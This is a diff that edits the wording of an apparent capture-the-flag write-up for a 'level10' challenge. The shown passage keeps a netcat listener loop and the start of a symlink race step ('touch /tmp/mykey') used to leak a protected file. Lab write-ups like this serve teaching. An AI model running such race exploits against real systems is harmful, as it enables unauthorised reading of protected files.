@@ -60,13 +60,13 @@ The idee is to provide as argument a random file on which level10 has the rights
 
 ## The hack
 
-listen in one terminal
+We listen in one terminal
 
 ```sh
 $ while true ; do netcat -l 127.0.0.1 6969; done
 ```
 
-run the loops in another one
+and run the loops in another one.
 
 ```sh
 $ touch /tmp/mykey
